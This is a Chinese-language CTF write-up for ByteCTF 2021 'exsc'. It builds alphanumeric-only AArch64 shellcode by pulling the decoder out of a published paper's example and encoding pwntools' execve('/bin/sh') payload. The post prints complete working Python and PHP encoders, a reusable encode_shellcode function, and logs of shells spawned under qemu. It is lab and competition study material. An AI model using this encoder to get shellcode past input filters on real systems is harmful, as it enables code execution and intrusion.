---
title: ByteCTF 2021 AArch64 shellcode exsc
categories:
- CTF/Pwn
tags: 
---

> 赛后和王皓共同完成，目标为AArch64纯字符shellcode，认真看论文把编解码器抠出来即可。赛时没做出此题着实该反思。

附件：[exsc.zip](https://xuanxuanblingbling.github.io/assets/attachment/bytectf/exsc.zip)

## 困惑

目标很简单，就是AArch64的纯字符shellcode，有论文：[ARMv8 Shellcodes from 'A' to 'Z'](https://arxiv.org/pdf/1608.03415.pdf)。其实今年打defcon初赛的时候就看到这篇了，到比赛时已经是看过第三次，但都没认真看，也都没看明白，看起来是给了shellcode的编码和解码方式，但每次看到Decoder’s Source Code，就很困惑，这也不是编码器的php啊：

```c
divert(-1)
changequote ({,})
...
```

主要是因为自己阅读非中文的东西很难抓住重点，其实认真看就能看到这是m4宏语言：

```c
This code is pre-processed by m4 which performs macro expansion
```

相关介绍：

- [learn-m4](https://github.com/yifengyou/learn-m4)
- [宏定义的黑魔法 - 宏菜鸟起飞手册](https://onevcat.com/2014/01/black-magic-in-macro/)
- [m4宏语言概览](https://www.chungkwong.cc/m4.html)
- [宏语言为何不受欢迎？](https://zhuanlan.zhihu.com/p/55122317)

系列教程：

- [让这世界再多一份GNU m4 教程(1)](https://segmentfault.com/a/1190000004104696)
- [让这世界再多一份GNU m4 教程(2)](https://segmentfault.com/a/1190000004108113)
- [让这世界再多一份GNU m4 教程(3)](https://segmentfault.com/a/1190000004128102)
- [让这世界再多一份GNU m4 教程(4)](https://segmentfault.com/a/1190000004131031)
- [让这世界再多一份GNU m4 教程(5)](https://segmentfault.com/a/1190000004137562)

## 解决

赛后皓哥教我，其实不需要看懂什么m4，因为首先按照纯字符shellcode的一般原理，其就是由解码器和编码过的payload两部分组成，并且论文中给出了一个arm64裸机可打印helloworld的示例shellcode。所以如果论文方案中，解码器和payload是完全独立的，则可以复用示例shellcode中前面的解码部分，然后将linux用户态的 **execve("/bin/sh",0,0)** 的shellcode按论文方案编码，然后替换helloworld中的功能payload即可，所以关键变成了如何把这段示例shellcode拆分出来：

```c
The following program prints "Hello world" when executed in QEMU (tested
with qemu-system-aarch64 -machine virt -cpu cortex-a57 -machine
type=virt -nographic -smp 1 -m 2048 -kernel shellcode.bin --append
"console=ttyAMA0").The notation (X)^(Y) means that X is repeated Y times.

jiL0JaBqJe4qKbL0kaBqkM91k121sBSjsBSjb2Sj
b8Y7R1A9Y5A9Jm01Je0qrR2J9O0r9CrJyI38ki01
ke0qBh01Bd0qszH6PPBPJHMBAOPPPPIAAKPPPPID
PPPPPPADPPALPPECPBBPJAMBPAPCHPMBPABPJAOB
BAPPDPOIJAOOBOCGPAALPPECAOBHPPGADAPPPPOI
FAPPPPEDJPPAHPEBOGOOOOAGLPPCEOMFOMGKKNJI
OMPCPPIAOCPKPPOIOCPCPPJJFPPBDPCIHPPPPPCD
GCPFPPIANLOOOOIGOLOOOOAGOCPKDPOIOMGKLBJH
LPPCEOMFOMGKKOJIPPPMHPEBOMPCPPIANDOOOOIG
JPPLHPEBNBOOOOIGHPPMHPEBNPOOOOIGHPPMHPEB
MNOOOOIGNPPMHPEBMLOOOOIGHPPEHPEBMJOOOOIG
PPPDHPEBMHOOOOIGNPPNHPEBMFOOOOIGNPPMHPEB
MDOOOOIGDPPNHPEBMBOOOOIGHPPMHPEBMPOOOOIG
HPPLHPEBLNOOOOIGBPPDHPEBLLOOOOIGDPPAHPEB
LJOOOOIGPPPPHPEBOMGKLAJHLPPCEOMF
(BBBB) ^ (854)
(Z3Zj) ^ (77)
szO6
```

首先可以验证一下这个helloworld好不好使：

> 感悟：安全真是魔法，这段更像咒语了，因为是可读的

```python
import os
shellcode = b'''
jiL0JaBqJe4qKbL0kaBqkM91k121sBSjsBSjb2Sj
b8Y7R1A9Y5A9Jm01Je0qrR2J9O0r9CrJyI38ki01
ke0qBh01Bd0qszH6PPBPJHMBAOPPPPIAAKPPPPID
PPPPPPADPPALPPECPBBPJAMBPAPCHPMBPABPJAOB
BAPPDPOIJAOOBOCGPAALPPECAOBHPPGADAPPPPOI
FAPPPPEDJPPAHPEBOGOOOOAGLPPCEOMFOMGKKNJI
OMPCPPIAOCPKPPOIOCPCPPJJFPPBDPCIHPPPPPCD
GCPFPPIANLOOOOIGOLOOOOAGOCPKDPOIOMGKLBJH
LPPCEOMFOMGKKOJIPPPMHPEBOMPCPPIANDOOOOIG
JPPLHPEBNBOOOOIGHPPMHPEBNPOOOOIGHPPMHPEB
MNOOOOIGNPPMHPEBMLOOOOIGHPPEHPEBMJOOOOIG
PPPDHPEBMHOOOOIGNPPNHPEBMFOOOOIGNPPMHPEB
MDOOOOIGDPPNHPEBMBOOOOIGHPPMHPEBMPOOOOIG
HPPLHPEBLNOOOOIGBPPDHPEBLLOOOOIGDPPAHPEB
LJOOOOIGPPPPHPEBOMGKLAJHLPPCEOMF
'''

shellcode += b'BBBB'*854
shellcode += b'Z3Zj'*77
shellcode += b'szO6'
shellcode = shellcode.replace(b'\n',b'')

f = open("shellcode",'wb')
f.write(shellcode)
f.close()

cmd = 'qemu-system-aarch64 -machine virt -cpu cortex-a57 -nographic -kernel shellcode'
os.system(cmd)
```

还真好使，使用control+a然后松开按x，即可停止qemu-system ：

```python
➜  python3 exp.py
hello, world!
QEMU: Terminated
```

## 生成

首先使用论文里给的php编码器，一点不用改，直接生成编码的shellcode：

```python
from pwn import *
import os
context(arch='aarch64',os='linux')

gen = b'''
<?php
function mkchr($c){
    return(chr(0x40+$c));
}
$s=file_get_contents('shellcode.bin.tmp');
$p=file_get_contents('payload.bin');
$b=0x60;
for($i=0;$i<strlen($p);$i++)
{
    $q=ord($p[$i]);
    $s[$b+2*$i]=mkchr(($q>>4)&0xF);
    $s[$b+2*$i+1]=mkchr($q&0xF);
}
$s=str_replace('@','P',$s);
file_put_contents('shellcode.bin',$s);
?>
'''

f = open("gen.php",'wb')
f.write(gen)
f.close()

f = open("payload.bin",'wb')
f.write(asm(shellcraft.sh()))
f.close()

os.system("touch shellcode.bin.tmp")
os.system("php gen.php")
os.system("cat shellcode.bin")
```

结果前面有一堆空格，后来发现，上面这段php其中的`$b=0x60`就是拆分大小，也是空格的成因...

```python
➜  python3 exp.py
NNDEHLMBBNLMJMOBNNNELEOBNNFENNOBPOPMHPMBNNCOKOJINPPCPPIANAPCAOJJNBPCAOJJJHAKHPMBPAPPPPMD
```

赛后皓哥教我，此法能把shellcode变成纯字符的本质道理是把shellcode的一个字节拆成两个字节，如同 hex string：

```python
>>> from pwn import *
>>> context(arch='aarch64',os='linux')
>>> len(asm(shellcraft.sh()))
44
>>> len('NNDEHLMBBNLMJMOBNNNELEOBNNFENNOBPOPMHPMBNNCOKOJINPPCPPIANAPCAOJJNBPCAOJJJHAKHPMBPAPPPPMD')
88
```


## 拆分

然后就是从示例shellcode拆出来解码器，不知道为啥论文就是没给直接拆好的解码shellcode，是希望读者看一遍而不是拿来就用么？想要自己拆分，就得认真看解码器的实现了，其实前面的m4就是替换汇编中的一些寄存器啥的，主要明白这段就行：

```c
/* S++ */
    ADDS WS , WS , #0xC1A
    SUBS WS , WS , #0xC19
    TBZ  WZ , #0b01001 , next
pool : repeat (978 , { .word 0x42424242 })
```

皓哥分析出来pool就是编码过的shellcode，所以这里978个BBBB就是编码的shellcode的填充。而helloworld中有854个BBBB，所以从示例shellcode往前倒（二声）(978-854)*4 = 496个字符即可。

```python
from pwn import *
context(arch='aarch64',os='linux')
shellcode = b'''
jiL0JaBqJe4qKbL0kaBqkM91k121sBSjsBSjb2Sj
b8Y7R1A9Y5A9Jm01Je0qrR2J9O0r9CrJyI38ki01
ke0qBh01Bd0qszH6PPBPJHMBAOPPPPIAAKPPPPID
PPPPPPADPPALPPECPBBPJAMBPAPCHPMBPABPJAOB
BAPPDPOIJAOOBOCGPAALPPECAOBHPPGADAPPPPOI
FAPPPPEDJPPAHPEBOGOOOOAGLPPCEOMFOMGKKNJI
OMPCPPIAOCPKPPOIOCPCPPJJFPPBDPCIHPPPPPCD
GCPFPPIANLOOOOIGOLOOOOAGOCPKDPOIOMGKLBJH
LPPCEOMFOMGKKOJIPPPMHPEBOMPCPPIANDOOOOIG
JPPLHPEBNBOOOOIGHPPMHPEBNPOOOOIGHPPMHPEB
MNOOOOIGNPPMHPEBMLOOOOIGHPPEHPEBMJOOOOIG
PPPDHPEBMHOOOOIGNPPNHPEBMFOOOOIGNPPMHPEB
MDOOOOIGDPPNHPEBMBOOOOIGHPPMHPEBMPOOOOIG
HPPLHPEBLNOOOOIGBPPDHPEBLLOOOOIGDPPAHPEB
LJOOOOIGPPPPHPEBOMGKLAJHLPPCEOMF
'''

shellcode = shellcode.replace(b'\n',b'')
shellcode = shellcode[:-496]

print(shellcode)
print(disasm(shellcode))
```

查看反汇编的确是到tbz，这是一句跳转：

> tbz: Test bit and branch if zero to a label at a PC-relative offset

```python
➜  python3 exp.py
b'jiL0JaBqJe4qKbL0kaBqkM91k121sBSjsBSjb2Sjb8Y7R1A9Y5A9Jm01Je0qrR2J9O0r9CrJyI38ki01ke0qBh01Bd0qszH6'
   0:   304c696a        adr     x10, 0x98d2d
   4:   7142614a        subs    w10, w10, #0x98, lsl #12
   8:   7134654a        subs    w10, w10, #0xd19
   c:   304c624b        adr     x11, 0x98c55
  10:   7142616b        subs    w11, w11, #0x98, lsl #12
  14:   31394d6b        adds    w11, w11, #0xe53
  18:   3132316b        adds    w11, w11, #0xc8c
  1c:   6a534273        ands    w19, w19, w19, lsr #16
  20:   6a534273        ands    w19, w19, w19, lsr #16
  24:   6a533262        ands    w2, w19, w19, lsr #12
  28:   37593862        tbnz    w2, #11, 0x2734
  2c:   39413152        ldrb    w18, [x10, #76]
  30:   39413559        ldrb    w25, [x10, #77]
  34:   31306d4a        adds    w10, w10, #0xc1b
  38:   7130654a        subs    w10, w10, #0xc19
  3c:   4a325272        eon     w18, w19, w18, lsl #20
  40:   72304f39        ands    w25, w25, #0xffff000f
  44:   4a724339        eon     w25, w25, w18, lsr #16
  48:   38334979        strb    w25, [x11, w19, uxtw]
  4c:   3130696b        adds    w11, w11, #0xc1a
  50:   7130656b        subs    w11, w11, #0xc19
  54:   31306842        adds    w2, w2, #0xc1a
  58:   71306442        subs    w2, w2, #0xc19
  5c:   36487a73        tbz     w19, #9, 0xfa8
```

## 缝合

最后就是将解码器和编码后的shellcode拼起来，并且首先要补充好978的BBBB的长度，另外全部的编码shellcode需要填充大一点，这里填到了0x3000，才能正常运行，否则shellcode会使用未被映射的地址空间导致错误，本题中给了0x4000，空间足够。

```python
from pwn import *
context(arch='aarch64',os='linux')
shellcode = b'''
jiL0JaBqJe4qKbL0kaBqkM91k121sBSjsBSjb2Sj
b8Y7R1A9Y5A9Jm01Je0qrR2J9O0r9CrJyI38ki01
ke0qBh01Bd0qszH6PPBPJHMBAOPPPPIAAKPPPPID
PPPPPPADPPALPPECPBBPJAMBPAPCHPMBPABPJAOB
BAPPDPOIJAOOBOCGPAALPPECAOBHPPGADAPPPPOI
FAPPPPEDJPPAHPEBOGOOOOAGLPPCEOMFOMGKKNJI
OMPCPPIAOCPKPPOIOCPCPPJJFPPBDPCIHPPPPPCD
GCPFPPIANLOOOOIGOLOOOOAGOCPKDPOIOMGKLBJH
LPPCEOMFOMGKKOJIPPPMHPEBOMPCPPIANDOOOOIG
JPPLHPEBNBOOOOIGHPPMHPEBNPOOOOIGHPPMHPEB
MNOOOOIGNPPMHPEBMLOOOOIGHPPEHPEBMJOOOOIG
PPPDHPEBMHOOOOIGNPPNHPEBMFOOOOIGNPPMHPEB
MDOOOOIGDPPNHPEBMBOOOOIGHPPMHPEBMPOOOOIG
HPPLHPEBLNOOOOIGBPPDHPEBLLOOOOIGDPPAHPEB
LJOOOOIGPPPPHPEBOMGKLAJHLPPCEOMF
'''

execve = b'NNDEHLMBBNLMJMOBNNNELEOBNNFENNOBPOPMHPMBNNCOKOJINPPCPPIANAPCAOJJNBPCAOJJJHAKHPMBPAPPPPMD'
execve = execve.ljust(978*4,b'B')

shellcode = shellcode.replace(b'\n',b'')
shellcode = shellcode[:-496]
shellcode += execve
shellcode += b'Z3Zj'*77
shellcode += b'szO6'
shellcode = shellcode.ljust(0x3000,b'B')

f = open("shellcode",'wb')
f.write(make_elf(shellcode))
f.close() 

f = open("shellcode.txt",'wb')
f.write(shellcode)
f.close() 
```

使用pwntools的make_elf可将shellcode封成elf直接测试，通过后可以使用题目测试：

```python
➜  python3 exp.py          
➜  chmod +x ./shellcode    
➜  qemu-aarch64 ./shellcode
$ ls
exp.py	gen.php  payload.bin  shellcode  shellcode.bin	shellcode.bin.tmp  shellcode.txt
➜  qemu-aarch64 -L /usr/aarch64-linux-gnu  ./ezsc ./shellcode.txt
Run!
$ ls
exp.py	gen.php  payload.bin  shellcode  shellcode.bin	shellcode.bin.tmp  shellcode.txt
```

让我们来看一下这神奇咒语的全貌吧，感受一下奇妙的计算机，我觉得这是值得的：

![image](https://xuanxuanblingbling.github.io/assets/pic/byte/magic.png)

反思一下，做出此题的确不难，比赛时一个是没认真看论文，还想另辟蹊径看看有多少纯字符的指令能用，本以为没多少，尝试用pwntools的disasm去爆破可用纯字符指令发现太多了，就彻底放弃了。后来赛后做题时还有个小插曲，同学抄shellcode时，将`szO6`抄成了`sz06`，debug了好久才发现，都是跳转，一前一后：

```python
>>> from pwn import *
>>> context(arch='aarch64',os='linux')
>>> disasm(b'szO6')
'   0:   364f7a73        tbz     w19, #9, 0xffffffffffffef4c'
>>> disasm(b'sz06')
'   0:   36307a73        tbz     w19, #6, 0xf4c'
```

另外直接使用题目二进制进行qemu调试可能会出现bus error的错误，分析如下：

- 分析排错发现首先是pwndbg的锅
- 撤掉pwndbg后会由于非法访存死掉，此内存是mmap的空间
- 分析可能是因为mmap的private或者由于文件大小不足导致操作系统没有真正分配内存
- 但正常情况下应该会有缺页中断来处理此错误，所以猜测可能是qemu实现等问题

## 一体

原论文给出的代码不便于工具化，分析那段php其实就是个类似hex的编码，python完整工具实现如下：

```python
from pwn import *
context(arch='aarch64',os='linux')

def encode_shellcode(shellcode):
    head  = 'jiL0JaBqJe4qKbL0kaBqkM91k121sBSjsBSjb2Sjb8Y7R1A9'
    head += 'Y5A9Jm01Je0qrR2J9O0r9CrJyI38ki01ke0qBh01Bd0qszH6'
    tail  = 'Z3Zj'*77 + 'szO6'
    s = ''
    for i in shellcode.hex():
        s += chr(int(i,16)+0x40)
    s = s.replace('@','P').ljust(978*4,'B')
    return (head + s + tail)

shellcode = encode_shellcode(asm(shellcraft.sh()))
shellcode = shellcode.ljust(0x3000,'B')

f = open("shellcode",'wb')
f.write(make_elf(shellcode.encode()))
f.close() 
```

测试成功：

```c
➜  python3 exp.py          
➜  chmod +x ./shellcode    
➜  qemu-aarch64 ./shellcode
$ 
```

其他WP:

- [ByteCTF 2021 writeup（官方WP）](https://bytedance.feishu.cn/docs/doccntSbxsYPGEXw7wLP0TY73df#)
- [ByteCTF 2021 Final Master of HTTPD && exsc 题解](https://eqqie.cn/index.php/archives/1888)